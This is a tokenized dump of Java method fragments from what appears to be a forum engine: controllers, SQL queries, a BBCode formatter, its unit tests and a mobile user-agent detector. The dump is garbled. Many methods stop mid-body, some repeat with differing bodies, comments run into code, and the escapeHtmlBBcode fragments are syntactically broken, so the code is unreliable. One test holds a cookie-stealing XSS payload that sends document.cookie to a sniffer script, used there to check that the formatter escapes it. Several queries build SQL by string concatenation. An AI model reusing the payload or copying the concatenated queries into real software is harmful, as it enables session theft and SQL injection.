public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; longInfo = rs . getString ( " longinfo " ) ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = dataSource . getConnection ( ) ; 
public ModelAndView modifyGroup ( @RequestParam ( " group " ) int id , @RequestParam ( " info " ) String info , @RequestParam ( " longinfo " ) String longInfo , @RequestParam ( value = " preview " , required = false ) String preview , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = dataSource . getConnection ( ) ; 
public ModelAndView loginForm ( ) throws Exception { return new ModelAndView ( " login-form " ) ; } 
public ModelAndView activateForm ( ) throws Exception { return new ModelAndView ( " activate " ) ; } 
public ModelAndView activateForm ( ) throws Exception { return new ModelAndView ( " activate " ) ; } 
public ModelAndView modifyUser ( HttpServletRequest request , HttpSession session , @RequestParam ( " action " ) String action , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = new ServletParameterParser ( request ) . getInt ( " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static Poll getPollByTopic ( Connection db , int msgid ) throws SQLException , PollNotFoundException { PreparedStatement pst = db . prepareStatement ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=? AND votenames.topic=topics.id " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new PollNotFoundException ( ) ; } return new Poll ( db , rs . getInt ( " id " ) ) ; } 
public ModelAndView showForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " msgid " , msgid ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView editVote ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( " id " ) int id , @RequestParam ( " title " ) String title ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public boolean evaluate ( Object o ) { return DefaultProfile . isBox ( ( String ) o ) ; } 
public static boolean isStyle ( String style ) { return styleSet . contains ( style ) ; } 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } 
private String processMessage ( String msg , String mode , boolean autourl ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; if ( " pre " . equals ( mode ) ) { form . enablePreformatMode ( ) ; } if ( autourl ) { form . enableUrlHighLightMode ( ) ; } if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND topics.moderate AND sections.moderate " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( ')' ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, " + " sections.id as section, NOT topics.sticky AS ssticky, sections.moderate " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, section, topic, userid, rank, message,bbcode FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
String show ( Connection db ) throws SQLException , UtilException , UserErrorException ; String getVariantID ( ProfileHashtable prof ) throws UtilException ; Date getExpire ( ) ; } 
private String processMessage ( String msg , String mode , boolean autourl ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; if ( autourl ) { form . enableUrlHighLightMode ( ) ; } if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public void testEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enableUrlHighLightMode ( ) ; try { String r = formatter . process ( ) ; 
public List < Message > getMessagesCached ( Connection db , Template tmpl ) throws UtilException , SQLException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( getVariantID ( tmpl . getProf ( ) ) ) ; List < Message > res = ( List < Message > ) mcc . get ( cacheId ) ; if ( res = = null ) { res = getMessages ( db ) ; mcc . add ( cacheId , res , getExpire ( ) ) ; } return res ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " &tg= " + URLEncoder . encode ( tag ) ) ; if ( viewAll ) { id . append ( " &v-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &sec= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &grp= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &dlmt= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &lmt= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . toString ( ) ; } 
public void testJavascriptURL ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , JAVASCRIPT_URL ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class= \" code \" >&quot;code&amp;code&quot;</div> " , result ) ; } 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " msgid " , msgid ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteComments ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " nick " , required = false ) String nick , @RequestParam ( " reason " ) String reason , @RequestParam ( " bonus " ) int bonus , HttpServletRequest request ) throws Exception { if ( bonus < 0 | | bonus > 20 ) { throw new BadParameterException ( " incorrect bonus value " ) ; } Connection db = null ; HttpSession session = request . getSession ( ) ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " topic " ) int topicId , @RequestParam ( value = " replyto " , required = false ) Integer replyTo , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " topic " , topicId ) ; params . put ( " mode " , tmpl . getFormatMode ( ) ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
public String getUserinfo ( Connection db ) throws SQLException { PreparedStatement st = db . prepareStatement ( " SELECT userinfo FROM users where id=? " ) ; st . setInt ( 1 , id ) ; ResultSet rs = st . executeQuery ( ) ; rs . next ( ) ; return rs . getString ( " userinfo " ) ; } 
public void setUserinfo ( Connection db , String text ) throws SQLException { PreparedStatement st = db . prepareStatement ( " UPDATE users SET userinfo=? where id=? " ) ; st . setString ( 1 , text ) ; st . setInt ( 2 , id ) ; st . executeUpdate ( ) ; } 
public static void setUserinfo ( Connection db , int id , String text ) throws SQLException { PreparedStatement st = db . prepareStatement ( " UPDATE users SET userinfo=? where id=? " ) ; st . setString ( 1 , text ) ; st . setInt ( 2 , id ) ; st . executeUpdate ( ) ; } 
public String getUserinfo ( Connection db ) throws SQLException { PreparedStatement st = db . prepareStatement ( " SELECT userinfo FROM users where id=? " ) ; st . setInt ( 1 , id ) ; ResultSet rs = st . executeQuery ( ) ; rs . next ( ) ; String userinfo = rs . getString ( " userinfo " ) ; if ( userinfo = = null ) { return " " ; 
private static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><pre class=code>&quot;code&amp;code&quot;</pre> " , result ) ; } 
public List < Message > getMessagesCached ( Connection db ) throws UtilException , SQLException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( getVariantID ( ) ) ; List < Message > res = ( List < Message > ) mcc . get ( cacheId ) ; if ( res = = null ) { res = getMessages ( db ) ; mcc . add ( cacheId , res , getExpire ( ) ) ; } return res ; } 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><pre class=code><p>&quot;code&amp;code&quot;</pre> " , result ) ; } 
public static DeleteInfo getDeleteInfo ( Connection db , int msgid ) throws SQLException { PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT nick,reason,users.id as userid, deldate FROM del_info,users WHERE msgid=? AND users.id=del_info.delby " ) ; 
private CharSequence processSimpleTag ( Connection db , RegexTag tag , CharSequence data ) throws SQLException { StringBuffer sb2 = new StringBuffer ( ( int ) ( data . length ( ) * 1.5 ) ) ; tag . substitute ( db , data , sb2 , tag , tag . getReplacement ( ) ) ; return sb2 ; } 
public String getProcessedMessage ( Connection db ) throws SQLException { return getProcessedMessage ( db , false ) ; } 
public String getProcessedMessage ( Connection db , boolean includeCut ) throws SQLException { if ( lorcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
private void pingFeedburner ( ) { try { config . setServerURL ( new URL ( " http:ping.feedburner.com/ " ) ) ; 
public void testUnexceptedCut ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( true ) ; String result = proc . preparePostText ( null , " [list][*][cut][/cut][/list] " ) ; assertEquals ( " <p><ul><li></ul> " , result ) ; } 
public void testBBinListType ( ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [b][list= \" [/b] \" ][/list] " ) ; assertEquals ( " <p>[b]<ol type= \" &#91;/b&#93; \" ></ol> " , result ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public ModelAndView removeUserpic ( HttpServletRequest request , HttpSession session , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not autorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, topic, userid, rank, message,bbcode FROM ( " + " SELECT " + " msgs.id, title, postdate, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpServletRequest request ) throws Exception { Connection db = null ; try { Message msg = new Message ( db , msgid ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " nick " , required = false ) String nick , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , required = false ) Integer bonus , HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpServletRequest request ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " tag " , required = false ) String tag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; try { if ( month = = null ) { 
private void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) throws SQLException , MessageNotFoundException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public boolean detectIphone ( ) { The iPod touch says it's an iPhone! So let's disambiguate. if (userAgent.indexOf(deviceIphone) != -1 && !detectIpod()) { return true; } return false; } 
public boolean detectIpod ( ) { if ( userAgent . indexOf ( deviceIpod ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectIphoneOrIpod ( ) { We repeat the searches here because some iPods may report themselves as an iPhone, which would be okay. if (userAgent.indexOf(deviceIphone) != -1 || userAgent.indexOf(deviceIpod) != -1) { return true; } return false; } 
public boolean detectAndroid ( ) { if ( userAgent . indexOf ( deviceAndroid ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectAndroidWebKit ( ) { if ( detectAndroid ( ) & & detectWebkit ( ) ) { return true ; } return false ; } 
public boolean detectWebkit ( ) { if ( userAgent . indexOf ( engineWebKit ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectS60OssBrowser ( ) { First, test for WebKit, then make sure it's either Symbian or S60. if (detectWebkit() && (userAgent.indexOf(deviceSymbian) != -1 || userAgent.indexOf(deviceS60) != -1)) { return true; } return false; } 
public boolean detectSymbianOS ( ) { if ( userAgent . indexOf ( deviceSymbian ) ! = - 1 | | userAgent . indexOf ( deviceS60 ) ! = - 1 | | userAgent . indexOf ( deviceS70 ) ! = - 1 | | userAgent . indexOf ( deviceS80 ) ! = - 1 | | userAgent . indexOf ( deviceS90 ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectWindowsMobile ( ) { Most devices use 'Windows CE', but some report 'iemobile' and some older ones report as 'PIE' for Pocket IE. if (userAgent.indexOf(deviceWinMob) != -1 || userAgent.indexOf(deviceIeMob) != -1 || userAgent.indexOf(enginePie) != -1 || (detectWapWml() && userAgent.indexOf(deviceWindows) != -1)) { return true; } return false; } 
public boolean detectBlackBerry ( ) { if ( userAgent . indexOf ( deviceBB ) ! = - 1 | | httpAccept . indexOf ( vndRIM ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectPalmOS ( ) { Most devices nowadays report as 'Palm', but some older ones reported as Blazer or Xiino. if (userAgent.indexOf(devicePalm) != -1 || userAgent.indexOf(engineBlazer) != -1 || userAgent.indexOf(engineXiino) != -1) { return true; } return false; } 
public boolean detectSmartphone ( ) { return ( detectIphoneOrIpod ( ) | | detectS60OssBrowser ( ) | | 
public boolean detectBrewDevice ( ) { if ( userAgent . indexOf ( deviceBrew ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectDangerHiptop ( ) { if ( userAgent . indexOf ( deviceDanger ) ! = - 1 | | userAgent . indexOf ( deviceHiptop ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectOperaMobile ( ) { if ( userAgent . indexOf ( engineOpera ) ! = - 1 & & ( userAgent . indexOf ( mini ) ! = - 1 | | userAgent . indexOf ( mobi ) ! = - 1 ) ) { return true ; } return false ; } 
public boolean detectWapWml ( ) { if ( httpAccept . indexOf ( vndwap ) ! = - 1 | | httpAccept . indexOf ( wml ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectMobileQuick ( ) { Ordered roughly by market share, WAP/XML > Brew > Smartphone. if (detectWapWml()) { return true; } if (detectBrewDevice()) { return true; } Updated by AHand if (detectOperaMobile()) { return true; } if (userAgent.indexOf(engineUpBrowser) != -1) { return true; } if (userAgent.indexOf(engineOpenWeb) != -1) { return true; } if (userAgent.indexOf(deviceMidp) != -1) { return true; } if (detectSmartphone()) { return true; } if (detectDangerHiptop()) { return true; } if (detectMidpCapable()) { return true; } if (userAgent.indexOf(devicePda) != -1) { return true; } if (userAgent.indexOf(mobile) != -1) { return true; } detect older phones from certain manufacturers and operators. if (userAgent.indexOf(uplink) != -1) { return true; } if (userAgent.indexOf(manuSonyEricsson) != -1) { return true; } if (userAgent.indexOf(manuericsson) != -1) { return true; } if (userAgent.indexOf(manuSamsung1) != -1) { return true; } if (userAgent.indexOf(svcDocomo) != -1) { return true; } if (userAgent.indexOf(svcKddi) != -1) { return true; } if (userAgent.indexOf(svcVodafone) != -1) { return true; } return false; } 
public boolean detectSonyPlaystation ( ) { if ( userAgent . indexOf ( devicePlaystation ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectNintendo ( ) { if ( userAgent . indexOf ( deviceNintendo ) ! = - 1 | | userAgent . indexOf ( deviceWii ) ! = - 1 | | userAgent . indexOf ( deviceNintendoDs ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectXbox ( ) { if ( userAgent . indexOf ( deviceXbox ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectGameConsole ( ) { if ( detectSonyPlaystation ( ) | | detectNintendo ( ) | | detectXbox ( ) ) { return true ; } return false ; } 
public boolean detectMidpCapable ( ) { if ( userAgent . indexOf ( deviceMidp ) ! = - 1 | | httpAccept . indexOf ( deviceMidp ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectMaemoTablet ( ) { if ( userAgent . indexOf ( maemo ) ! = - 1 ) { return true ; } else if ( userAgent . indexOf ( maemoTablet ) ! = - 1 & & userAgent . indexOf ( linux ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectArchos ( ) { if ( userAgent . indexOf ( deviceArchos ) ! = - 1 ) { return true ; } return false ; } 
public boolean detectSonyMylo ( ) { if ( userAgent . indexOf ( manuSony ) ! = - 1 & & ( userAgent . indexOf ( qtembedded ) ! = - 1 | | userAgent . indexOf ( mylocom2 ) ! = - 1 ) ) { return true ; } return false ; } 
public boolean detectMobileLong ( ) { if ( detectMobileQuick ( ) | | detectMaemoTablet ( ) | | detectGameConsole ( ) ) { return true ; } return false ; } 
public boolean detectTierIphone ( ) { if ( detectIphoneOrIpod ( ) | | tdetectAndroid ( ) | | tdetectAndroidWebKit ( ) ) { return true ; } return false ; } 
public boolean detectTierSmartphones ( ) { if ( detectSmartphone ( ) & & ( ! detectTierIphone ( ) ) ) { return true ; } return false ; } 
public boolean detectTierOtherPhones ( ) { if ( detectMobileQuick ( ) & & ( ! detectTierIphone ( ) ) & & ( ! detectTierSmartphones ( ) ) ) { return true ; } return false ; } 
public boolean isMobile ( ) { if ( ! style . equals ( " tango " ) ) { return false ; } return userAgent . detectAndroidWebKit ( ) ; } 
public ModelAndView vote ( HttpServletRequest request , @RequestParam ( " vote " ) int vote , @RequestParam ( " voteid " ) int voteid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) throws Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; try { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
private int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
public void testCodeExcape ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><pre class=code><p>&quot;code&amp;code&quot;</pre><p> " , result ) ; } 
public String show ( Connection db ) throws SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, title, postdate, topic, userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
